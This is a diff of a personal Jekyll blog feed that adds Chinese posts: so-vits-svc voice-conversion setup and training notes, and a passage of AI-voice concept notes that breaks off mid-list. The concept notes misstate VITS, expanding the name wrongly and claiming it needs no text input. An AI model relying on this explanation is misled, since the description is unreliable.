@@ -6,9 +6,656 @@
     <description>欢迎来到我的个人站~</description>
     <link>http://localhost:4000/</link>
     <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml"/>
-    <pubDate>Tue, 28 Nov 2023 02:34:42 +0800</pubDate>
-    <lastBuildDate>Tue, 28 Nov 2023 02:34:42 +0800</lastBuildDate>
+    <pubDate>Mon, 04 Mar 2024 11:55:33 +0800</pubDate>
+    <lastBuildDate>Mon, 04 Mar 2024 11:55:33 +0800</lastBuildDate>
     <generator>Jekyll v3.8.5</generator>
+    
+    <item>
+      <title>so-vits-svc 执行笔记</title>
+      <description>&lt;h3 id=&quot;风能否向月而行&quot;&gt;风能否向月而行。&lt;/h3&gt;
+
+&lt;h2 id=&quot;相关教程和参考资料&quot;&gt;相关教程和参考资料&lt;/h2&gt;
+
+&lt;p&gt;so-vits-svc 项目地址： &lt;a href=&quot;https://github.com/svc-develop-team/so-vits-svc.git&quot;&gt;https://github.com/svc-develop-team/so-vits-svc.git&lt;/a&gt; &lt;br /&gt;
+官方 README 文档：&lt;a href=&quot;https://github.com/svc-develop-team/so-vits-svc/blob/4.1-Stable/README_zh_CN.md&quot;&gt;https://github.com/svc-develop-team/so-vits-svc/blob/4.1-Stable/README_zh_CN.md&lt;/a&gt;&lt;br /&gt;
+B 站 up Sucial的非常详细的教学视频： &lt;a href=&quot;https://www.bilibili.com/video/BV1Hr4y197Cy?p=1&amp;amp;vd_source=98a6ce1d2586467c3641a8b5aac049ed&quot;&gt;https://www.bilibili.com/video/BV1Hr4y197Cy?p=1&amp;amp;vd_source=98a6ce1d2586467c3641a8b5aac049ed&lt;/a&gt;&lt;br /&gt;
+教学视频的笔记： &lt;a href=&quot;https://github.com/SUC-DriverOld/so-vits-svc-Chinese-Detaild-Documents?tab=readme-ov-file&quot;&gt;https://github.com/SUC-DriverOld/so-vits-svc-Chinese-Detaild-Documents?tab=readme-ov-file&lt;/a&gt;&lt;br /&gt;
+B 站 up Sucial的UVR5人声分离教程: &lt;a href=&quot;https://www.bilibili.com/video/BV1F4421c7qU/?vd_source=98a6ce1d2586467c3641a8b5aac049ed&quot;&gt;https://www.bilibili.com/video/BV1F4421c7qU/?vd_source=98a6ce1d2586467c3641a8b5aac049ed&lt;/a&gt;&lt;br /&gt;
+一些报错的解决办法（来自 B 站 up：羽毛布団）: &lt;a href=&quot;https://www.bilibili.com/read/cv22206231/&quot;&gt;https://www.bilibili.com/read/cv22206231/&lt;/a&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;关于环境配置&quot;&gt;关于环境配置&lt;/h2&gt;
+
+&lt;p&gt;需要 显存 6G+，并设置虚拟内存 20G+；&lt;/p&gt;
+
+&lt;p&gt;需要 NVIDIA-CUDA，版本11或版本12，请安装。&lt;br /&gt;
+查看cuda 版本&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nvcc -V   
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;br /&gt;
+&lt;img src=&quot;/images/posts/20240221/6.jpg&quot; alt=&quot;&quot; width=&quot;90%&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;需要 安装 visual studio 2022，组件里装“使用 c++的桌面开发”。否则依赖包 fairseq 会安装失败。&lt;/p&gt;
+
+&lt;p&gt;需要环境管理系统 conda，请安装。&lt;/p&gt;
+
+&lt;p&gt;源码下载4.1-Stable稳定版 &lt;a href=&quot;https://github.com/svc-develop-team/so-vits-svc.git&quot;&gt;https://github.com/svc-develop-team/so-vits-svc.git&lt;/a&gt;&lt;br /&gt;
+vsCode 打开项目，在控制台使用 conda 创建虚拟环境，并启用&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;//创建名称为 env_so_vits_svc 的虚拟环境并安装python 3.9版本。  
+conda create -n env_so_vits_svc python=3.9  
+//查看是否创建成功
+conda env list
+//启用环境
+conda activate env_so_vits_svc
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;修改 requirements_win.txt 文件，将 gradio&amp;gt;=3.7.0 改为 gradio==3.41.2，并添加三个依赖包 fastapi==0.84.0  pydantic==1.10.12  tensorflow&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gradio==3.41.2  
+fastapi==0.84.0  
+pydantic==1.10.12 
+//用于辅助判断训练结果
+tensorflow
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;然后安装依赖包 (windows)&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    pip install -r requirements_win.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;安装Pytorch， 版本要与CUDA对应，Pytorch 官网&lt;a href=&quot;https://pytorch.org/get-started/locally/&quot;&gt;https://pytorch.org/get-started/locally/&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;
+&lt;img src=&quot;/images/posts/20240221/7.jpg&quot; alt=&quot;&quot; width=&quot;90%&quot; /&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;conda install pytorch torchvision torchaudio pytorch-cuda=12.1 -c pytorch -c nvidia
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;验证是否安装成功&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    python
+    # 回车运行
+    import torch
+    # 回车运行
+    print(torch.__version__)
+    # 回车运行
+    print(torch.cuda.is_available())
+    # 回车运行
+    //最后一行出现True则成功，出现False则失败，需要重新安装.  
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;br /&gt;
+&lt;img src=&quot;/images/posts/20240221/8.jpg&quot; alt=&quot;&quot; width=&quot;90%&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;音频数据集准备&quot;&gt;音频数据集准备&lt;/h2&gt;
+&lt;ol&gt;
+  &lt;li&gt;
+    &lt;p&gt;音频格式为wav，通过 Adobe Audition 的持续时间排序功能，删除时长 比较短的和比较长的，（回到原文件夹再次删除所有音频，由于Adobe Audition程序占用着没有删除的音频，从而无法删除占用音频，但是能够删除在Adobe Audition 中删除的音频，以此达到我们的过滤删除目的）每条时长在5s～15s之间最佳，过长容易爆内存，保留150条数据以上，然后拖拽所有文件到下方，选中所有，匹配响度。关闭Adobe Audition，保存所有。
+&lt;br /&gt;
+&lt;img src=&quot;/images/posts/20240221/1.jpg&quot; alt=&quot;&quot; width=&quot;90%&quot; /&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;回到原文件夹，删除因为匹配响度而产生的所有.pkf文件.&lt;br /&gt;
+&lt;br /&gt;
+&lt;img src=&quot;/images/posts/20240221/11.jpg&quot; alt=&quot;&quot; width=&quot;90%&quot; /&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;将数据集放入项目中的 dataset_raw 目录，数据集以人名命名即可，不可为中文,原则上可同时训练多个人的声音模型，我同时训练了3个，出现了节奏不对的问题，不知道是否是因为同时训练产生的。建议单独训练，且训练1个和多个的时间是累加关系，所以同时训练多个并不会节省时间。
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; dataset_raw
+ ├───speaker0
+ │   ├───xxx1-xxx1.wav
+ │   ├───...
+ │   └───Lxx-0xx8.wav
+ └───speaker1
+     ├───xx2-0xxx2.wav
+     ├───...
+     └───xxx7-xxx007.wav
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;在dataset_raw下创建config.json文件。
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &quot;n_speakers&quot;: 1
+
+ &quot;spk&quot;:{
+     &quot;文件夹名字（不可为中文）&quot;: 0
+ }
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+    &lt;p&gt;&lt;br /&gt;
+&lt;img src=&quot;/images/posts/20240221/2.jpg&quot; alt=&quot;&quot; width=&quot;90%&quot; /&gt;  &lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h2 id=&quot;预先下载的模型文件&quot;&gt;预先下载的模型文件&lt;/h2&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;
+    &lt;p&gt;使用 contentvec 作为声音编码器（默认且推荐）
+下载 contentvec ：checkpoint_best_legacy_500.pt &lt;a href=&quot;https://ibm.ent.box.com/s/z1wgl1stco8ffooyatzdwsqn2psd9lrr&quot;&gt;https://ibm.ent.box.com/s/z1wgl1stco8ffooyatzdwsqn2psd9lrr&lt;/a&gt; 放在pretrain目录下.&lt;br /&gt;
+ 或者下载下面的 ContentVec，大小只有 199MB，但效果相同:&lt;br /&gt;
+ contentvec ：hubert_base.pt &lt;a href=&quot;https://huggingface.co/lj1995/VoiceConversionWebUI/resolve/main/hubert_base.pt&quot;&gt;https://huggingface.co/lj1995/VoiceConversionWebUI/resolve/main/hubert_base.pt&lt;/a&gt; , 将文件名改为checkpoint_best_legacy_500.pt后，放在pretrain目录下.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;预训练底模文件： G_0.pth, D_0.pth 放在logs/44k目录下.&lt;br /&gt;
+扩散模型预训练底模文件： model_0.pt 放在logs/44k/diffusion目录下.&lt;br /&gt;
+&lt;a href=&quot;https://huggingface.co/Sucial/so-vits-svc4.1-pretrain_model&quot;&gt;https://huggingface.co/Sucial/so-vits-svc4.1-pretrain_model&lt;/a&gt;包含G_0.pth，D_0.pth，model_0.pt.s&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h2 id=&quot;程序执行&quot;&gt;程序执行&lt;/h2&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;
+    &lt;p&gt;重采样至 44100Hz 单声道,添加–skip_loudnorm 跳过响度匹配步骤.&lt;/p&gt;
+
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; python resample.py --skip_loudnorm
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+    &lt;p&gt;执行成功后，.\dataset\44k 目录下将生成音频文件，如下图&lt;br /&gt;
+ &lt;br /&gt;
+ &lt;img src=&quot;/images/posts/20240221/3.jpg&quot; alt=&quot;&quot; width=&quot;90%&quot; /&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;自动划分训练集、验证集，以及自动生成配置文件，增加–vol_aug 参数使用响度嵌入。
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; python preprocess_flist_config.py --speech_encoder vec768l12 --vol_aug
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+
+    &lt;p&gt;运行完毕后 .\configs\ 目录下将生成 config.json 与 diffusion.yaml 文件&lt;br /&gt;
+ 此时可以在生成的 config.json 与 diffusion.yaml 修改部分参数&lt;br /&gt;
+     keep_ckpts：训练时保留最后几个模型，0为保留所有，默认只保留最后3个。&lt;br /&gt;
+     batch_size：单次训练加载到 GPU 的数据量，调整到低于显存容量的大小即可,默认是6，6g显存的需调为3比较好。&lt;/p&gt;
+
+    &lt;p&gt;如下图&lt;br /&gt;
+ &lt;br /&gt;
+ &lt;img src=&quot;/images/posts/20240221/4.jpg&quot; alt=&quot;&quot; width=&quot;90%&quot; /&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;生成 hubert 与 f0。尚若需要浅扩散功能（可选），需要增加–use_diff 参数.执行需要一定时间。&lt;/p&gt;
+
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; python preprocess_hubert_f0.py --f0_predictor dio --use_diff
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+    &lt;p&gt;执行成功后，每个音频文件都生成了5个相关的文件，如下图&lt;br /&gt;
+ &lt;br /&gt;
+ &lt;img src=&quot;/images/posts/20240221/5.jpg&quot; alt=&quot;&quot; width=&quot;90%&quot; /&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;主模型训练，需要5万步起，至少训练36小时，可ctrl+c中断，继续训练再次执行命令即可。&lt;/p&gt;
+
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; python train.py -c configs/config.json -m 44k
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+
+    &lt;p&gt;扩散模型训练（可选），测试效果：我没听出来有啥变化。&lt;/p&gt;
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; python train_diff.py -c configs/diffusion.yaml
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+    &lt;p&gt;模型训练结束后，模型文件保存在logs/44k目录下，扩散模型在logs/44k/diffusion下。&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;模型压缩/打包分享&lt;/p&gt;
+
+    &lt;p&gt;生成的模型含有继续训练所需的信息。如果确认不再训练，可以移除模型中此部分信息，得到约 1/3 大小的最终模型。&lt;/p&gt;
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; python compress_model.py -c=&quot;configs/config.json&quot; -i=&quot;logs/44k/G_30400.pth&quot; -o=&quot;logs/44k/release.pth&quot;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;训练结果的判断
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;// 启动 tensorboard ，命令行输入
+python -m tensorboard.main --logdir=logs\44k
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+    &lt;p&gt;命令行返回一个本地地址，浏览器打开地址，需要等待训练200步之后才会出现表格。此时命令行窗口不能关闭。 
+如何判断训练的差不多了？找到 loss 标签下的 loss/g/lf0，当图像趋于稳定的直线时，则说明训练的差不多了，此时去推理听一听结果在做判断。下图是训练十万步的结果。 
+ &lt;br /&gt;
+ &lt;img src=&quot;/images/posts/20240221/c.jpg&quot; alt=&quot;&quot; width=&quot;90%&quot; /&gt;&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;由于命令行开启 tensorboard 会占用命令行窗口，写一个 .bat 执行文件，专门用于打开tensorboard，命名为 启动tensorboard.bat 即可，放在项目根目录下，双击点开即可&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    chcp 65001
+    @echo off
+
+    echo 正在启动Tensorboard...
+    echo 如果看到输出了一条网址（大概率是localhost:6006）就可以访问该网址进入Tensorboard了
+
+    //D:\Anaconda\envs\env_so_vits_svc 替换这个地址为自己的conda环境地址
+    D:\Anaconda\envs\env_so_vits_svc\python.exe -m tensorboard.main --logdir=logs\44k
+
+    pause
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;br /&gt;
+    &lt;img src=&quot;/images/posts/20240221/e.jpg&quot; alt=&quot;&quot; width=&quot;90%&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;目标音频处理-uvr5工具&quot;&gt;目标音频处理 uvr5工具&lt;/h2&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;原曲分离为 伴奏+带和声的人声 &lt;br /&gt;
+method = MDX-Net，segment size = 512，overlap = 30
+model = MDX23C-InstVoc HQ&lt;br /&gt;
+ &lt;br /&gt;
+ &lt;img src=&quot;/images/posts/20240221/9.jpg&quot; alt=&quot;&quot; width=&quot;90%&quot; /&gt;&lt;/li&gt;
+  &lt;li&gt;带和声的人声分离为 和声 + 人声（和声是否需要的问题）&lt;br /&gt;
+method = VR Architecture，window size = 320，aggression setting = 5
+model = 5_HP-Karaoke-UVR(激进)\model = 6_HP-Karaoke-UVR(平滑)
+ &lt;br /&gt;
+ &lt;img src=&quot;/images/posts/20240221/a.jpg&quot; alt=&quot;&quot; width=&quot;90%&quot; /&gt;&lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;人声去除混响 &lt;br /&gt;
+method = VR Architecture，window size = 320，aggression setting = 5
+model = UVR-De-Echo-Normal&lt;br /&gt;
+勾选只要无混响的干声。
+ &lt;br /&gt;
+ &lt;img src=&quot;/images/posts/20240221/b.jpg&quot; alt=&quot;&quot; width=&quot;90%&quot; /&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;如果上述3步之后还存在明显的噪声，再选择UVR-DeNoice去噪。&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;经过处理后最终得到 伴奏 + 干声。&lt;/p&gt;
+
+&lt;h2 id=&quot;推理&quot;&gt;推理&lt;/h2&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;使用以下命令打开 webui 界面,推理期间，此命令行窗口不能关闭。
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; python webUI.py
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+
+    &lt;p&gt;由于命令行开启 webui 界面会占用命令行窗口，写一个 .bat 执行文件，专门用于打开推理界面，命名为 启动 webui.bat 即可，放在项目根目录下，双击点开即可&lt;/p&gt;
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;     chcp 65001
+     @echo off
+
+     echo 初始化并启动WebUI……初次启动可能会花上较长时间
+     echo WebUI运行过程中请勿关闭此窗口！
+
+     //D:\Anaconda\envs\env_so_vits_svc 替换这个地址为自己的conda环境地址
+     D:\Anaconda\envs\env_so_vits_svc\python.exe webUI.py
+
+     pause
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+
+    &lt;p&gt;&lt;br /&gt;
+ &lt;img src=&quot;/images/posts/20240221/d.jpg&quot; alt=&quot;&quot; width=&quot;90%&quot; /&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;模型选择 .\logs\44k\G_步数.pth 文件，配置文件选择 .\configs\config.json&lt;br /&gt;
+下面的音频选择 选择处理好的干声。&lt;br /&gt;
+其他参数不需要动。&lt;/li&gt;
+  &lt;li&gt;点击音频转换，生成推理后的音频。&lt;/li&gt;
+  &lt;li&gt;通过其他软件比如 剪映 合成 推理后的音频 + 伴奏，完成。&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;关于文字转音频，点击文字转音频，输入文本，勾选上方F0预测，点击转换即可。&lt;/p&gt;
+
+&lt;h2 id=&quot;关于-conda&quot;&gt;关于 conda&lt;/h2&gt;
+
+&lt;p&gt;Conda是一个开源的软件包管理系统和环境管理系统，用于安装和管理软件包及其依赖项。它最初是为Python语言设计的，但也可用于其他语言和工具。Conda允许用户轻松地创建、分享、管理和部署环境和软件包，使开发人员能够更有效地管理项目的依赖关系。&lt;/p&gt;
+
+&lt;p&gt;Conda的主要特点包括：&lt;/p&gt;
+&lt;ol&gt;
+  &lt;li&gt;软件包管理：Conda可以安装、更新、卸载和管理软件包及其依赖项。&lt;/li&gt;
+  &lt;li&gt;环境管理：Conda允许用户创建多个隔离的环境，每个环境都可以拥有不同版本的软件包，从而使得不同项目之间的依赖关系可以互相隔离，避免冲突。&lt;/li&gt;
+  &lt;li&gt;跨平台性：Conda支持在不同的操作系统上运行，包括Windows、macOS和Linux。&lt;/li&gt;
+  &lt;li&gt;开源和社区支持：Conda是开源的，有一个活跃的社区支持，用户可以分享和贡献软件包和环境。&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;总的来说，Conda是一个强大而灵活的工具，可以帮助开发人员更轻松地管理项目的依赖关系，提高开发效率。&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;//conda 的版本查看
+conda -V
+
+//存在的conda环境查看，正在启用的环境会有*标。
+conda info --envs
+或者
+conda envs list
+
+//创建 名为 pytorch_gpu, python版本为3.9 的虚拟环境
+conda create -n pytorch_gpu python=3.9 
+
+//启用名为 pytorch_gpu 的环境，
+conda activate pytorch_gpu 
+
+//取消正在启用环境
+conda deactivate
+
+//删除创建的环境
+conda env remove --name &amp;lt;环境名称&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;br /&gt; 
+&lt;br /&gt; 
+&lt;br /&gt; 
+&lt;br /&gt; 
+&lt;br /&gt; 
+&lt;br /&gt; 
+&lt;br /&gt; 
+&lt;br /&gt; 
+&lt;br /&gt; 
+&lt;br /&gt; 
+&lt;br /&gt; 
+&lt;br /&gt;&lt;/p&gt;
+</description>
+      <pubDate>Wed, 21 Feb 2024 00:00:00 +0800</pubDate>
+      <link>http://localhost:4000/2024/02/so-vits-svc-%E6%89%A7%E8%A1%8C%E7%AC%94%E8%AE%B0/</link>
+      <guid isPermaLink="true">http://localhost:4000/2024/02/so-vits-svc-%E6%89%A7%E8%A1%8C%E7%AC%94%E8%AE%B0/</guid>
+        
+      <category>技术_AI语音</category>
+        
+        
+    </item>
+    
+    <item>
+      <title>AI语音_知识点整理</title>
+      <description>&lt;h3 id=&quot;乐观是极度的绝境之中唯一的武器也是最后的救命稻草&quot;&gt;乐观是极度的绝境之中唯一的武器，也是最后的救命稻草。&lt;/h3&gt;
+
+&lt;p&gt;&lt;strong&gt;声音的基本属性：&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;音色（Timbre）：音色是声音的质地或音质，是使不同乐器或人的声音听起来不同的特征。即使两个声音具有相同的音调（频率）和响度（振幅），它们的音色也可能不同。
+    音色是由声波的谐波成分和频谱分布所决定的，不同乐器或声源产生的声波谐波成分和频谱分布不同，因此具有不同的音色。
+
+音调（Pitch）：音调是声音的频率属性，表示声波振动的快慢程度。频率高的声音听起来比频率低的声音更尖锐。音调与声音的音高相关，高频率对应高音调，低频率对应低音调。
+    在音乐中，音调通常与音符的高低对应，用来描述音符的音高。
+
+响度（Loudness）：响度是声音的振幅或强度属性，表示声波振动的幅度大小，也称为音量。振幅大的声音听起来更响亮，振幅小的声音听起来更柔和。
+    响度通常与声音的音量相关，较高的振幅对应更高的音量。在音乐中，响度常用来描述音符的强弱或音乐的整体音量。
+
+    响度通常以分贝（dB）为单位进行描述，分贝是一种对声音强度的对数测量单位，它基于声压级（声压的对数比）来表示声音的相对强度。
+
+    通常情况下，人类能够感知的响度范围非常广泛，从非常微弱的声音，比如安静的耳语（约20分贝），到非常响亮的声音，比如飞机发动机的轰鸣（约120分贝）。
+
+    以下是一些常见的声音响度范围及其描述：
+
+    0-20 分贝：极其安静，类似于安静的图书馆或夜晚的室外。
+    20-40 分贝：安静，类似于低声细语或轻微的风声。
+    40-60 分贝：一般的谈话声或办公室环境。
+    60-80 分贝：相对较大的声音，如电视机声音、交通噪音或餐馆内的谈话声。
+    80-100 分贝：较大的声音，如汽车喇叭声、音乐会的声音或运动场上的欢呼声。
+    100-120 分贝：非常响亮的声音，如摩托车引擎声或工厂机器声。
+    120 分贝以上：极端响亮的声音，如飞机发动机声、火箭发射声。
+    响度的测量通常是以标准声压级（20微帕）作为基准。因此，一个声音的响度可以被描述为相对于标准声压级的对数比，并以分贝为单位。
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;TTS 和 VITS 的区别&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;文本到语音（TTS）和Voice Inverse Text-to-Speech（VITS）是两种不同的语音合成方法，它们在原理和应用方面有一些显著的区别：
+
+1. **输入数据**：
+   - TTS：TTS系统接收文本作为输入，然后生成对应的语音输出。它将文本转换为声音，并通常包括文本预处理、语音合成和音频后处理等步骤。
+   - VITS：VITS直接从声音信号到声音信号进行训练，跳过了中间的文本表示。它不需要文本输入，而是直接处理声音信号。
+
+2. **训练方法**：
+   - TTS：TTS系统通常使用文本语料库和对应的语音语料库进行训练。它需要大量的文本-语音配对数据来学习文本到语音的映射关系。
+   - VITS：VITS训练的输入和输出都是声音信号，它可以直接从声音信号对之间的关系中学习，而无需使用文本-语音配对数据。
+
+3. **应用场景**：
+   - TTS：TTS系统通常用于将文本转换为语音，例如语音助手、语音播报、自动电话系统等应用。
+   - VITS：VITS更适用于声音信号处理的任务，例如声音合成、声音增强、语音转换等应用。
+
+4. **训练复杂度**：
+   - TTS：由于TTS系统需要大量的文本-语音配对数据进行训练，因此其训练复杂度较高。
+   - VITS：VITS不需要文本-语音配对数据，可以直接从声音信号中学习，因此其训练复杂度较低。
+
+总的来说，TTS和VITS是两种不同的语音合成方法，它们在输入数据、训练方法、应用场景和训练复杂度等方面有所不同，可以根据具体的需求选择合适的方法。
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;Github 项目 vits&lt;/strong&gt;   &lt;a href=&quot;https://github.com/jaywalnut310/vits&quot;&gt;GitHub地址：https://github.com/jaywalnut310/vits&lt;/a&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
+VITS 是 https://github.com/RVC-Boss/GPT-SoVITS 的基础框架。 
+
+VITS是一种基于自注意力机制（self-attention）的声音合成方法。以下是该项目的基本原理：
+
+1. **自注意力机制（Self-Attention）**：自注意力机制是一种用于处理序列数据的机制，它可以根据输入序列中各个元素之间的关系来动态地调整每个元素的权重。
+在语音合成中，自注意力机制可以帮助模型捕捉声音信号中不同部分之间的相关性和依赖关系。
+
+2. **声音合成**：VITS是一种端到端的声音合成方法，它直接从声音信号到声音信号进行训练和生成，跳过了中间的文本表示。这种方法可以更好地保留声音的特征和表达，
+从而产生更加自然和高质量的声音合成结果。
+
+3. **模型架构**：VITS模型使用了自注意力机制来建模声音信号之间的长距离依赖关系，并通过学习声音信号的高级表示来实现声音合成。该模型可能包括编码器和解码器部分，
+编码器负责将输入声音信号编码为高级表示，而解码器则负责根据这些表示生成输出声音信号。
+
+4. **训练方法**：VITS模型可能使用了大量的声音信号数据进行训练，通过最小化声音合成时的预测误差来优化模型参数。训练过程可能会使用自注意力机制和梯度下降等技术来实现。
+
+通过以上原理，VITS能够实现高质量的端到端声音合成，无需依赖于中间的文本表示，适用于多种语音合成和声音处理任务。
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;Github 项目 ar-vits&lt;/strong&gt;  &lt;a href=&quot;https://github.com/innnky/ar-vits&quot;&gt;GitHub地址：https://github.com/innnky/ar-vits&lt;/a&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
+AutoRegressive-VITS（自回归-VITS）
+
+AR-VITS 是 https://github.com/RVC-Boss/GPT-SoVITS 的基础框架。 
+
+AR-VITS是一种用于声音合成的模型。以下是该项目的基本原理：
+
+1. **AutoRegressive (AR)**：
+AutoRegressive是指使用过去时间步的输出作为输入来预测下一个时间步的模型。在声音合成中，这意味着模型会考虑之前的声音样本来预测下一个时间步的声音。
+
+1. **VITS**：
